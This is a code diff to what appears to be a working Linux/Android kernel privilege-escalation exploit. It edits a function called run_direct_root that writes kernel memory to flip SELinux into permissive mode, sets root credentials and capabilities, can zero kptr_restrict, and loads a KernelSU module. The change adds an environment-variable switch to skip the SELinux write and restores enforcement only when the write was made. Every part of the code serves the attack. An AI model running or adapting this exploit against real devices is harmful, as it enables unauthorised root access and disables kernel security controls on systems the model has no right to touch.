@@ -7745,7 +7745,7 @@ static int run_direct_root(const struct exp_opts *o, unsigned long long slide) {
     unsigned long long R = 0, sel;
     pid_t child = -1;
     int go = -1, st = -1, writes = 0, caps_ok = 0, fsuid_ok = 0;
-    int window = 0, live = 0;
+    int window = 0, live = 0, win_touched = 0;
     int used_cli = 0, ko_loaded = 0;
     int status = 0;
 
@@ -7841,20 +7841,27 @@ static int run_direct_root(const struct exp_opts *o, unsigned long long slide) {
     if (!caps_ok)
         goto fail;
 
-    /* permissive window */
+    /* permissive window (skippable for the no-side-effect load path) */
     sel = SYM_SELINUX_STATE + slide + SEL_ENF_OFF;
-    if (selinux_enforce_now() == 0)
+    if (getenv("CVE99491_KSU_NO_PERMISSIVE")) {
         window = 1;
-    else if (direct_enforce_window(sel, o, 1) == 0) {
-        window = 1;
-        writes++;
+        printf("[!] permissive window SKIPPED (CVE99491_KSU_NO_PERMISSIVE): "
+               "selinux_state untouched\n");
+    } else {
+        if (selinux_enforce_now() == 0)
+            window = 1;
+        else if (direct_enforce_window(sel, o, 1) == 0) {
+            window = 1;
+            win_touched = 1;
+            writes++;
+        }
+        if (!window) {
+            printf("[-] direct root: permissive window failed\n");
+            goto fail;
+        }
+        printf("[!] permissive window opened at selinux_state-1 (fallback path; "
+               "one byte before selinux_state is touched)\n");
     }
-    if (!window) {
-        printf("[-] direct root: permissive window failed\n");
-        goto fail;
-    }
-    printf("[!] permissive window opened at selinux_state-1 (fallback path; "
-           "one byte before selinux_state is touched)\n");
 
     /* Optional: zero kptr_restrict so the ksud CLI can read /proc/kallsyms
      * (kptr_restrict=2 hides addresses unless CAP_SYSLOG is held).  The address
@@ -7880,7 +7887,8 @@ static int run_direct_root(const struct exp_opts *o, unsigned long long slide) {
     }
 
     if (g_no_ksu) {
-        (void)direct_enforce_window(sel, o, 0);
+        if (win_touched)
+            (void)direct_enforce_window(sel, o, 0);
         printf("[+] direct root: creds+caps done; --no-ksu stops before module "
                "(enforce=%d)\n", selinux_enforce_now());
         goto done;
@@ -7950,7 +7958,7 @@ static int run_direct_root(const struct exp_opts *o, unsigned long long slide) {
     printf("MODULE_LOADED\n");
 
     /* restore Enforcing through the same direct word (enforcing=0x0e!=0) */
-    if (selinux_enforce_now() != 1)
+    if (win_touched && selinux_enforce_now() != 1)
         (void)direct_enforce_window(sel, o, 0);
     printf("[f] module_live=1 enforce=%d\n", selinux_enforce_now() == 1 ? 1 : 0);
     if (selinux_enforce_now() != 1)
@@ -7975,7 +7983,7 @@ static int run_direct_root(const struct exp_opts *o, unsigned long long slide) {
 fail:
     printf("[-] direct root failed\n");
     printf("PARKED\n");
-    if (window)
+    if (win_touched)
         (void)direct_enforce_window(sel, o, 0);
     direct_child_kill(&child, &go, &st);
     return 1;
